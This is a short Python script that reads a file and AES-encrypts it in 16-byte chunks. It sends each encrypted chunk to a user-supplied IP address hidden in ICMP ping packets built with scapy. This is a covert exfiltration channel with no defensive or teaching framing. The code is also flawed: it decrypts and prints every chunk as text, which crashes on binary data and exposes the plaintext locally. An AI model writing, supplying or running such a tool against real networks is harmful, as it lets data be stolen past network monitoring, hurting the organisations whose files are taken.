import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from scapy.all import IP, ICMP, send

def read_file_chunks(file_path, chunk_size=16):
    chunks = []
    try:
        with open(file_path, 'rb') as file:
            while True:
                chunk = file.read(chunk_size)
                if not chunk:
                    break
                chunks.append(chunk)
        return chunks
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

def encrypt_chunk(chunk, key):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(chunk) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

def decrypt_chunk(encrypted_chunk, key):
    iv = encrypted_chunk[:16]
    ciphertext = encrypted_chunk[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data

def send_icmp_packets(chunks, dst_ip, key):
    print("Sending ICMP packets...")
    for idx, chunk in enumerate(chunks):
        encrypted_chunk = encrypt_chunk(chunk, key)
        decrypted_chunk = decrypt_chunk(encrypted_chunk, key)
        print(f"Decrypted chunk {idx + 1}: {decrypted_chunk.decode('utf-8')}")
        packet = IP(dst=dst_ip)/ICMP()/encrypted_chunk
        send(packet)
        print(f"Sent chunk {idx + 1} of {len(chunks)}")

def main():
    if len(sys.argv) != 4:
        print("Usage: python script.py <file_path> <destination_ip> <key>")
        sys.exit(1)

    file_path = sys.argv[1]
    dst_ip = sys.argv[2]
    key = sys.argv[3]

    if not os.path.isfile(file_path):
        print(f"Error: '{file_path}' is not a valid file path.")
        sys.exit(1)

    chunk_size = 16  # Bytes
    chunks = read_file_chunks(file_path, chunk_size)
    if len(key) not in [16, 24, 32]:
        print("Error: Invalid key size. Key must be 16, 24, or 32 bytes long for AES.")
        sys.exit(1)
    key = key.encode('utf-8')
    send_icmp_packets(chunks, dst_ip, key)

if __name__ == "__main__":
    main()
